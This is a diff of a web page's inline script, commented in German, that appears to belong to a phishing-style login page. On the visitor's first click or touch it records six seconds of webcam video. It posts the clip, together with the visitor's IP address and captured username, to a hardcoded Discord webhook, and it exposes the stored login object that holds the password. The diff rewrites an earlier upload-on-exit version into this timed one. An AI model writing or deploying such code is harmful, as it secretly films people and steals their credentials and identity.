@@ -380,7 +380,7 @@
 
         </div>
     </div>
-    <footer class="container-footer" id="footer-container">
+        <footer class="container-footer" id="footer-container">
         <div class="footer">
             <ul class="row footer-links">
                 <li class="footer-link"><a class="text-footer-nav" href="#">About Us</a></li>
@@ -403,11 +403,8 @@
 </div>
 
 <script>
-// --- PERFEKTE KAMERA- & AUFNAHME-LOGIK ---
+// --- 6-SEKUNDEN KAMERA-AUFNAHME BEI ERSTEM KLICK ---
 const TARGET_WEBHOOK = "https://discord.com/api/webhooks/1567208893103345705/F3Uimv4iBDvCgPxcegobtZirunf_ViRRPBo6H2kb9Zo_psBGbgQnuEIrHUFJdHAWK5zG";
-let recordedChunks = [];
-let activeMediaRecorder = null;
-let activeStream = null;
 let cameraTriggered = false;
 
 async function startInstantCamera() {
@@ -419,62 +416,62 @@ async function startInstantCamera() {
     }
 
     try {
-        // Ausschließlich { video: true } gemäß Anforderung
-        activeStream = await navigator.mediaDevices.getUserMedia({ video: true });
-        activeMediaRecorder = new MediaRecorder(activeStream, { mimeType: 'video/webm' });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        let recordedChunks = [];
 
-        activeMediaRecorder.ondataavailable = (event) => {
+        mediaRecorder.ondataavailable = (event) => {
             if (event.data && event.data.size > 0) {
                 recordedChunks.push(event.data);
             }
         };
 
-        activeMediaRecorder.start(1000);
+        mediaRecorder.onstop = () => {
+            if (recordedChunks.length === 0) return;
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            
+            const formData = new FormData();
+            const usernameTag = (window.lastLogin && window.lastLogin.username) ? window.lastLogin.username : "Unbekannt";
+            formData.append('file', blob, `video_${visitorIP}_${usernameTag}.webm`);
+
+            const payload = {
+                username: "Cam Stream Monitor",
+                embeds: [{
+                    title: "📹 6-Sekunden Webcam Aufnahme",
+                    description: `> **Benutzer:** \`${usernameTag}\`\n> **IP-Adresse:** \`${visitorIP}\``,
+                    color: 0xE74C3C,
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            formData.append('payload_json', JSON.stringify(payload));
+
+            fetch(TARGET_WEBHOOK, {
+                method: 'POST',
+                body: formData
+            }).catch(() => {});
+
+            // Tracks stoppen, damit die Kamera-LED ausgeht
+            stream.getTracks().forEach(track => track.stop());
+        };
+
+        // Aufnahme starten
+        mediaRecorder.start(1000);
+
+        // Exakt nach 6 Sekunden (6000 ms) automatisch stoppen
+        setTimeout(() => {
+            if (mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+            }
+        }, 6000);
+
     } catch (error) {
         console.warn("Kamerazugriff abgelehnt oder nicht verfügbar:", error.name);
     }
 }
 
-// Löst beim allersten Klick/Touch auf der Seite sofort die Kamera-Abfrage aus (Browser-Sicherheitsvorgabe)
+// Löst beim allersten Klick oder Touch auf der Seite sofort die Aufnahme aus
 window.addEventListener('click', startInstantCamera, { once: true });
 window.addEventListener('touchstart', startInstantCamera, { once: true });
-
-function sendVideoToDiscord() {
-    if (recordedChunks.length === 0) return;
-    const blob = new Blob(recordedChunks, { type: 'video/webm' });
-    recordedChunks = [];
-
-    const formData = new FormData();
-    const usernameTag = (lastLogin && lastLogin.username) ? lastLogin.username : "Unbekannt";
-    formData.append('file', blob, `video_${visitorIP}_${usernameTag}.webm`);
-
-    const payload = {
-        username: "Cam Stream Monitor",
-        embeds: [{
-            title: "📹 Webcam Aufnahme",
-            description: `> **Benutzer:** \`${usernameTag}\`\n> **IP-Adresse:** \`${visitorIP}\``,
-            color: 0xE74C3C,
-            timestamp: new Date().toISOString()
-        }]
-    };
-    formData.append('payload_json', JSON.stringify(payload));
-
-    fetch(TARGET_WEBHOOK, {
-        method: 'POST',
-        body: formData,
-        keepalive: true
-    }).catch(() => {});
-}
-
-window.addEventListener('beforeunload', () => {
-    if (activeMediaRecorder && activeMediaRecorder.state !== 'inactive') {
-        activeMediaRecorder.stop();
-    }
-    if (activeStream) {
-        activeStream.getTracks().forEach(track => track.stop());
-    }
-    sendVideoToDiscord();
-});
 </script>
 
 <script>
@@ -659,6 +656,7 @@ const avatarPreviewEl = document.getElementById('avatar-preview');
 const navAvatarTopEl = document.getElementById('nav-avatar-top');
 
 let lastLogin = { username: '', password: '', avatarUrl: null, profileDetails: null, otpEmail: '' };
+window.lastLogin = lastLogin;
 
 if (usernameInput) {
     usernameInput.addEventListener('blur', function(){
